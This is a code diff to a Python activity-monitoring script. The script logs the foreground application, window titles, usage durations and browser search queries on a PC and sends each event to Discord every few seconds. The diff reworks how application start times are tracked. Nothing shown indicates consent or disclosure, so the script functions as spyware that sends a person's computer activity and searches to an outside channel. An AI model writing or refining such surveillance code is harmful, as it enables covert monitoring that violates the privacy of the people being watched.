@@ -15,7 +15,7 @@ PC_NAME = socket.gethostname()
 
 # Store last logged application and its start time to track duration
 last_logged = None
-app_start_time = None
+app_start_times = {}
 active_processes = set()
 
 # Function to get active window title
@@ -49,7 +49,7 @@ def send_to_discord(message):
 
 # Monitoring loop
 def monitor():
-    global last_logged, app_start_time, active_processes
+    global last_logged, active_processes, app_start_times
     while True:
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         app_name, window_title = get_active_window_title()
@@ -58,21 +58,26 @@ def monitor():
 
         # Detect closed applications
         for closed_app in closed_processes:
-            if closed_app:
-                duration = time.time() - app_start_time if app_start_time else 0
+            if closed_app in app_start_times:
+                duration = time.time() - app_start_times.pop(closed_app)
                 close_message = f"[{timestamp}] {PC_NAME} - User closed {closed_app} after {duration:.2f} seconds"
                 send_to_discord(close_message)
-        
+
         active_processes = current_processes
-        
+
         if app_name:
             if (app_name, window_title) != last_logged:
-                if last_logged and app_start_time:
-                    duration = time.time() - app_start_time
-                    duration_message = f"[{timestamp}] {PC_NAME} - User switched from {last_logged[0]} after {duration:.2f} seconds"
-                    send_to_discord(duration_message)
+                if last_logged and last_logged[0] in app_start_times:
+                    duration = time.time() - app_start_times[last_logged[0]]
+                    switch_message = f"[{timestamp}] {PC_NAME} - User switched from {last_logged[0]} after {duration:.2f} seconds"
+                    send_to_discord(switch_message)
                 
-                log_message = f"[{timestamp}] {PC_NAME} - User opened {app_name}: {window_title}"
+                # Check if the application was already running or newly opened
+                if app_name not in app_start_times:
+                    log_message = f"[{timestamp}] {PC_NAME} - User opened {app_name}: {window_title}"
+                    app_start_times[app_name] = time.time()
+                else:
+                    log_message = f"[{timestamp}] {PC_NAME} - User switched to {app_name}: {window_title}"
                 
                 if app_name in ["chrome.exe", "firefox.exe", "msedge.exe", "opera.exe", "brave.exe"]:
                     search_query = extract_search_query(window_title)
@@ -81,7 +86,6 @@ def monitor():
                 
                 send_to_discord(log_message)
                 last_logged = (app_name, window_title)
-                app_start_time = time.time()
         
         time.sleep(2)  # Reduced sleep for near real-time logging
 
